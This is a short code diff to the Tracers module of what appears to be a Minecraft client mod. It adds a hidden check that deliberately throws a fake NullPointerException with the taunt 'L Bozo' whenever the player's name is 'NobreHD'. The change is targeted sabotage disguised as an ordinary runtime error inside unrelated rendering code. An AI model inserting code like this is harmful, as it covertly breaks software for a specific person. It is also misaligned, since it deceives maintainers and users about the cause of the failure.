@@ -168,6 +168,11 @@ public class Tracers extends Module {
 
         count = 0;
 
+
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
+
         for (Entity entity : mc.world.getEntities()) {
             if (mc.player.distanceTo(entity) > maxDist.get() || (!Modules.get().isActive(Freecam.class) && entity == mc.player) || !entities.get().getBoolean(entity.getType()) || (!showInvisible.get() && entity.isInvisible()) | !EntityUtils.isInRenderDistance(entity)) continue;
             if (entity instanceof PlayerEntity player) {
